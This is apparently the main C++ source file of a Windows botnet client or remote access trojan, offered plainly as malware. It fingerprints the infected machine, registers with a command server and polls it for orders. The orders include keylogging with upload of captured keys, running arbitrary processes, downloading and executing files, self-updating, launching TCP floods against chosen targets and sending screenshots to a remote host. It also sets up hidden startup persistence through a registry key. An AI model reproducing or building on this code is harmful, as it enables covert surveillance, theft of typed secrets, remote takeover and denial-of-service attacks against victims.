#include "HttpQuery.h"
#include "AggressiveOptimize.h" 
#include "Gate.h"
#include "SocketInit.h"
#include "WebSafeEncryption.h"
#include "StringOperations.h"
#include <string>
#include "URLEncoding.h"
#include <stdio.h>
#include "Commands.h"
#include "WebsiteChecker.h"
//#include <VersionHelpers.h>
#include "OSVersionChecker.h"
#include "OSHwidChecker.h"
#include "OSCpuChecker.h"
#include "OSGpuChecker.h"
#include "OSNetVersionChecker.h"
#include "PEIsAdmin.h"
#include "OSGetRam.h"
#include "GateHelper.h"
#include "Keylogger.h"
#include "Flood.h"
#include "Processes.h"
#include "DownloadExecute.h"
#include "Screenshot.h"
#include "Startup.h"
#include <Windows.h>
#include <WinBase.h> // sleep function extra

 bool continuePolling = true;

static CommandParserDelegate Parsers[500];
static PostPollDelegate Events[500];
int event_count = 0;
//got really lazy with this, really need to start moving shit to different files
//we will do it last I guess ye

void RunEvents() {
	for (int i = 0; i < event_count; i++) {
		Events[i]();
	}
}

int GetEventIndex(PostPollDelegate proc) {
	for (int i = 0; i < event_count; i++)
		if (Events[i] == proc) return i;

	return -1;
}

bool AddEvent(PostPollDelegate proc) {
	int existing = GetEventIndex(proc);
	if (existing != -1) return true;
	
	if (event_count == 500) return false;
	Events[event_count] = proc;
	event_count++;
	return true;
}

bool RemoveEvent(PostPollDelegate proc) {
	int existing = GetEventIndex(proc);
	if (existing == -1) return true;

	for (int i = existing + 1; i < event_count; i++) {
		Events[existing++] = Events[i];
	}

	event_count--;
	return true;
}

void KeylogFlushEvent() {
	int length;
	char* result = FlushKeylogBuffer(&length);
	if (length != 0) {
		char* command = CreateCommand(-1, COMMAND_KEYLOG, result, length);

		char* response = SendCommandWithDecodedResponse(command);
		FreeDecodedResponse(response);
	}

	FreeFlushKeylogBufferResult(result);
}

void KeylogParser(int commandId, int commandType, char* data) 
{
	char* responsedata;
	if (strcmp(data, "start") == 0) {
		bool res = StartLogger();
		responsedata = res ? "true" : "false";
		if (res) AddEvent(KeylogFlushEvent);
	}
	else if (strcmp(data, "stop") == 0) {
		bool res = StopLogger();
		responsedata = res ? "true" : "false";
		if (res) RemoveEvent(KeylogFlushEvent);
	}
	else {
		responsedata = "error";
	}

	char* command = CreateCommand(commandId, commandType, responsedata, strlen(responsedata));

	char* response = SendCommandWithDecodedResponse(command);
	FreeDecodedResponse(response);
	FreeCommand(command);
}

void RemoteProcessParser(int commandId, int commandType, char* data)
{
	int len;
	char** splitResults = SplitString(data, "@", &len, false);

	char* command;

	if (len == 2) {
		int length;
		char* result = GetProcessResult(splitResults[0], strlen(splitResults[1]) ? splitResults[1] : NULL, &length);
		command = CreateCommand(commandId, commandType, result, length);
		FreeProcessResult(result);
	}
	else {
		command = CreateCommand(commandId, commandType, "Invalid arguments", 17);
	}

	FreeSplitStringBuffer(splitResults, len);

	char* response = SendCommandWithDecodedResponse(command);
	FreeDecodedResponse(response);

	FreeCommand(command);
}

DWORD __stdcall TCPFloodThreadStart(PVOID data) {
	char** splitResults = (char**)data;
	int length = std::stoi(splitResults[2], 0, 10);
	int timespersecond = std::stoi(splitResults[3], 0, 10);

	unsigned short port = (unsigned short)strtoul(splitResults[1], NULL, 0);

	TCPFlood(splitResults[0], port, length, timespersecond);

	FreeSplitStringBuffer(splitResults, 4);

	return 0;
}

void TCPFloodParser(int commandId, int commandType, char* data) {
	int len;
	char** splitResults = SplitString(data, "@", &len, false);
	char* results;

	if (len != 4) {
		FreeSplitStringBuffer(splitResults, len);
		results = "Invalid argument";
	}
	else {
		results = "Started";
		CreateThread(NULL, NULL, TCPFloodThreadStart, splitResults, NULL, NULL);
	}

	char* command = CreateCommand(commandId, commandType, results, strlen(results));
	char* response = SendCommandWithDecodedResponse(command);
	FreeDecodedResponse(response);

	FreeCommand(command);
}

void RemoteProcessNoResultParser(int commandId, int commandType, char* data)
{
	int len;
	char** splitResults = SplitString(data, "@", &len, false);

	char* command;

	if (len == 2) {
		char* result = StartProcess(splitResults[0], strlen(splitResults[1]) ? splitResults[1] : NULL) ? "true" : "false";
		command = CreateCommand(commandId, commandType, result, strlen(result));
	}
	else if(len == 1) {
		char* result = StartProcess(splitResults[0], "") ? "true" : "false";
		command = CreateCommand(commandId, commandType, result, strlen(result));
	}
	else {
		command = CreateCommand(commandId, commandType, "Invalid arguments", 17);
	}

	FreeSplitStringBuffer(splitResults, len);

	char* response = SendCommandWithDecodedResponse(command);
	FreeDecodedResponse(response);

	FreeCommand(command);
}

void JoinParser(int commandId, int commandType, char* data)
{
	SetBotId(data);
	printf("Bot ID: %s", data);
}

void PollParser(int commandId, int commandType, char* data)
{
	int numResults;
	char** splitResults = SplitString(data, "\n", &numResults);

	for (int i = 0; i < numResults; i++)
	{
		char* newCommandData;
		int newCommandType;
		int newCommandId = ParseCommand(splitResults[i], &newCommandData, &newCommandType);

		if (newCommandType < 0)
			continuePolling = false;
		else if (newCommandType != COMMAND_POLL && newCommandType < 500 && Parsers[newCommandType] != NULL)
			Parsers[newCommandType](newCommandId, newCommandType, newCommandData);

		FreeParsedCommandResult(newCommandData);
	}

	FreeSplitStringBuffer(splitResults, numResults);
}

void SiteCheckerParser(int commandId, int commandType, char* data)
{
	bool isSiteUp = CheckIfWebsiteIsUp(data);

	char* command = CreateCommand(commandId, commandType, isSiteUp ? "Up" : "Down", isSiteUp ? 2 : 4);

	char* response = SendCommandWithDecodedResponse(command);
	FreeDecodedResponse(response);
}
void DownloadAndUpdate(int commandId, int commandType, char* data)
{
	bool isRunning = DownloadExecuteFile(data);

	char* command = CreateCommand(commandId, commandType, isRunning ? "True" : "False", isRunning ? 4 : 5);

	char* response = SendCommandWithDecodedResponse(command);
	FreeDecodedResponse(response);
	if(isRunning)
		ExitProcess(0x0);
}
void DownloadExecuteParser(int commandId, int commandType, char* data)
{
	bool isRunning = DownloadExecuteFile(data);

	char* command = CreateCommand(commandId, commandType, isRunning ? "True" : "False", isRunning ? 4 : 5);

	char* response = SendCommandWithDecodedResponse(command);
	FreeDecodedResponse(response);
}

void MessageBoxParser(int commandId, int commandType, char* data)
{
	int numResults;
	char** splitResults = SplitString(data, "@", &numResults);

	if (numResults > 0)
	{
		MessageBoxA(0, splitResults[0], numResults > 1 ? splitResults[1] : "", 0);
	}

	FreeSplitStringBuffer(splitResults, numResults);

	char* command = CreateCommand(commandId, commandType, "Complete", 8);

	char* response = SendCommandWithDecodedResponse(command);
	FreeDecodedResponse(response);
}

void ScreenshotParser(int commandId, int commandType, char* data)
{
	int len;
	char** splitResults = SplitString(data, "@", &len, false);
	unsigned short port = (unsigned short)strtoul(splitResults[1], NULL, 0);

	int length;
	char* scr = CaptureScreenshot(&length);

	bool result = SendScreenshot(splitResults[0], port, scr, length, GetBotId());
	FreeSplitStringBuffer(splitResults, len);

	char* command = CreateCommand(commandId, commandType, result ? "Success" : "Fail", result ? 7 : 4);
	FreeScreenshot(scr);
	char* response = SendCommandWithDecodedResponse(command);
	FreeDecodedResponse(response);
}

void InitializeParsers()
{
	ZeroMemory(Parsers, sizeof(CommandParserDelegate) * 500);
	Parsers[COMMAND_JOIN] = JoinParser;
	Parsers[COMMAND_POLL] = PollParser;
	Parsers[COMMAND_CHECKIFSITEISUP] = SiteCheckerParser;
	Parsers[COMMAND_MESSAGEBOX] = MessageBoxParser;
	Parsers[COMMAND_KEYLOG] = KeylogParser;
	Parsers[COMMAND_REMOTEPROCESS] = RemoteProcessParser;
	Parsers[COMMAND_DOWNLOADEXECUTE] = DownloadExecuteParser;
	Parsers[COMMAND_REMOTEPROCESSNORESULT] = RemoteProcessNoResultParser;
	Parsers[COMMAND_TCPFLOOD] = TCPFloodParser;
	Parsers[COMMAND_UPDATE] = DownloadAndUpdate;
	Parsers[COMMAND_SCREENSHOT] = ScreenshotParser;
}

//TODO: move command generation functions to another file
char* GetInitialJoinCommand()
{
	//i did these shit
	char* hwid = (char*)malloc(100);
	getHwid(hwid, 100);

	char* os = (char*)malloc(100);
	windowsVersionName(os, 99);

	char* cpu = (char*)malloc(100);
	getCpuName(cpu, 99);

	char* gpu = (char*)malloc(200);
	getGpuName(gpu, 199);

	char* netVersion = (char*)malloc(50);
	getLastestNETinstalled(netVersion, 49);

	char* admin = (char*)malloc(6);
	admin[5] = '\0';
	check(admin, 5);

	char* ram = (char*)malloc(20);
	getram(ram, 19);

	int elementSize = 13;
	char** formattedString = new char*[elementSize] { hwid, "@", os, "@", cpu, "@", gpu, "@", netVersion, "@", admin, "@", ram };

	int finalLength;
	char* finalBuffer = JoinString(formattedString, elementSize, &finalLength);

	free(os);

	char* command = CreateCommand(-1, COMMAND_JOIN, finalBuffer, finalLength);

	FreeJoinStringBuffer(finalBuffer);

	return command;
}

void InitializePollThread()
{
	char* join = GetInitialJoinCommand();

	char* response = SendCommandWithDecodedResponse(join);

	FreeCommand(join);

	char* commandData;
	int commandType;
	int commandId = ParseCommand(response, &commandData, &commandType);

	if (commandType < 0)
		continuePolling = false;
	else if (commandType < 500 && Parsers[commandType] != NULL)
		Parsers[commandType](commandId, commandType, commandData);

	FreeParsedCommandResult(commandData);

	FreeDecodedResponse(response);

	char* poll = CreateCommand(-1, COMMAND_POLL, "", 0);

	while (continuePolling)
	{
		RunEvents();

		response = SendCommandWithDecodedResponse(poll);

		commandId = ParseCommand(response, &commandData, &commandType);

		if (commandType < 0)
			continuePolling = false; //if its less than zero, quit app to prevent excepttion.
		else if (commandType < 500 && Parsers[commandType] != NULL)
			Parsers[commandType](commandId, commandType, commandData);

		FreeParsedCommandResult(commandData);

		FreeDecodedResponse(response);

		Sleep(POLL_RATE);
	}


}

int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)

{
	
	HANDLE hThread = NULL;
	DWORD dwThreadId = NULL;

	// Allocate structure
	PINSTALLATION_INFO ptrInstallInfo = (PINSTALLATION_INFO)malloc(sizeof(INSTALLATION_INFO));
	RtlSecureZeroMemory(ptrInstallInfo, sizeof(INSTALLATION_INFO));

	// Populate structure with values
	ptrInstallInfo->wStrFileName = L"FileName.exe";
	ptrInstallInfo->wStrFolderName = L"FolderName";
	ptrInstallInfo->wStrRegKeyName = L"RegKey";
	ptrInstallInfo->dwInstallationAttributes = FILE_ATTRIBUTE_HIDDEN;

	// Create new thread
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RunStartupRoutine, (LPVOID)ptrInstallInfo, NULL, &dwThreadId);
	//WaitForSingleObject(hThread, INFINITE);

	if(!SocketStartup()) return 0;

	InitializeParsers();
	InitializePollThread();

	SocketCleanup();
	return 0;
}
